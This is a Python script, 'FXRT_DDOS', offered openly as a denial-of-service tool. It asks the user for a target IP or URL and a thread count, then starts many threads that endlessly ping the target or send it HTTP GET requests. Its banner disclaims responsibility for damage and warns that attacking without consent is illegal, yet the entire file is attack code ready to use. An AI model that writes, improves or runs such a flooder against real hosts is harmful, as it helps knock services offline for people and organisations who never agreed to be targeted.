#creator: Fxrt2711
#version: 1.0.0
#date: 25/1/24
#update: 26/1/24
#
try:
    import os
except:
    exit("missing MAIN lib: os")
try:
    import sys
except:
    exit("missing MAIN lib: sys")
try:
    from ping3 import ping, verbose_ping
except:
    exit("missing MAIN lib: ping3")
try:
    from colorama import Fore
except:
    exit("missing lib: colorama")
try:
    import threading
except:
    exit("missing lib: threading")
try:
    import requests
except:
    exit("missing lib: requests")
try:
    from time import sleep
except:
    exit("missing lib: time")
#
op_sy = sys.platform
#
#
def clear():
    if op_sy == ("linux"):
        os.system("clear")
    else:
        os.system("cls")
#
#
def dos_trget(target,st):
#
#    print(st)
    while True:
        try:
            if st == ("ip"):
                try:
                    ives = ping(target)
                    print(f"ping sented to {target} delay: {ives}")
                except:
                    print(f"waiting for {target} to accept")
                try:
                    pass
                except:
                    exit()
#
            else:
                rves = requests.get(target)
                print(f"Request sented to {target}")
                try:
                    pass
                except:
                    exit()
#
        except requests.exceptions.ConnectionError:
            sleep(0.1)
            print("Check internet connection")
            try:
                pass
            except:
                exit()
#
#
#
while True:
    clear()
    print(Fore.RED + """

                ╔═══╗╔═╗╔═╗╔═══╗╔════╗    ╔═══╗╔═══╗╔═══╗╔═══╗
                ║╔══╝╚╗╚╝╔╝║╔═╗║║╔╗╔╗║    ╚╗╔╗║╚╗╔╗║║╔═╗║║╔═╗║
                ║╚══╗ ╚╗╔╝ ║╚═╝║╚╝║║╚╝     ║║║║ ║║║║║║ ║║║╚══╗
                ║╔══╝ ╔╝╚╗ ║╔╗╔╝  ║║       ║║║║ ║║║║║║ ║║╚══╗║
               ╔╝╚╗  ╔╝╔╗╚╗║║║╚╗ ╔╝╚╗     ╔╝╚╝║╔╝╚╝║║╚═╝║║╚═╝║
               ╚══╝  ╚═╝╚═╝╚╝╚═╝ ╚══╝     ╚═══╝╚═══╝╚═══╝╚═══╝
        (◣_◢)I am not responsible for damage caused by FXRT_DDOS (◣_◢)
    (◣_◢)Attacking targets without prior mutual consent is ILLIGAL!!!(◣_◢)
    """)
#
    run_url = True
    run_http_url = True
    run_https_url = True
    run_ip = True
    run_target_selsection = True
#
    while run_target_selsection:
#
        print (Fore.GREEN + "do you want to ddos (ip)(https)(http)")
        selection_input = input("~> ")
#
        if selection_input == ("http"):
            while run_http_url:
#
                target_url_ip = input(Fore.GREEN + "Enter URL>> ")
#
                if target_url_ip.startswith("https"):
                    print("wrong url. you can,t ddos https")
                    pass
#
                elif not target_url_ip.__contains__("."):
                    print("invalid domain")
                    pass
#
                else:
                    run_http_url = False
                    run_target_selsection = False
#
        elif selection_input == ("https"):
            while run_https_url:
#
                target_url_ip = input(Fore.GREEN + "Enter URL>> ")
#
                if not target_url_ip.startswith("https"):
                    print("wrong url. you can,t ddos http")
                    pass
#
                elif not target_url_ip.__contains__("."):
                    print("invalid domain")
                    pass
#
                else:
                    run_https_url = False
                    run_target_selsection = False
#
        elif selection_input == ("ip"):
            while run_ip:
#
                target_url_ip = input(Fore.GREEN + "Enter IP>> ")
                if not target_url_ip.__contains__("."):
                    print("invalid ip")
                    pass
#
                else:
                    run_ip = False
                    run_target_selsection = False
#
        else:
            pass
#
#
    run_threads = True
    while run_threads:
        try:
#
            threads = int(input(Fore.GREEN + "Threads: " + Fore.RED + ""))
#
            if threads <= 0:
                print("invalid number")
                pass
            elif threads == ():
                print("invalid number")
                pass
            else:
                run_threads = False
#
        except:
            print("invalid number")
            pass
# 
#
#
    print("press enter to start the attack")
    nothing = input("")
#
    if not selection_input == ("ip"):
        for i in range(0, threads):
#
            thr = threading.Thread(target=dos_trget, args=(target_url_ip,"ht",))
            thr_1 = threading.Thread(target=dos_trget, args=(target_url_ip,"ht",))
            thr_2 = threading.Thread(target=dos_trget, args=(target_url_ip,"ht",))
            thr_3 = threading.Thread(target=dos_trget, args=(target_url_ip,"ht",))
            thr_4 = threading.Thread(target=dos_trget, args=(target_url_ip,"ht",))
            thr_5 = threading.Thread(target=dos_trget, args=(target_url_ip,"ht",))
            thr_6 = threading.Thread(target=dos_trget, args=(target_url_ip,"ht",))
            thr_7 = threading.Thread(target=dos_trget, args=(target_url_ip,"ht",))
            thr_8 = threading.Thread(target=dos_trget, args=(target_url_ip,"ht",))
#
            thr.start()
            thr_1.start()
            thr_2.start()
            thr_3.start()
            thr_4.start()
            thr_5.start()
            thr_6.start()
            thr_7.start()
            thr_8.start()
            print(f"waiting for {target_url_ip} to accept")
            try:
                pass
            except:
                exit()
    else:
        dos_trget(target_url_ip,"ip")
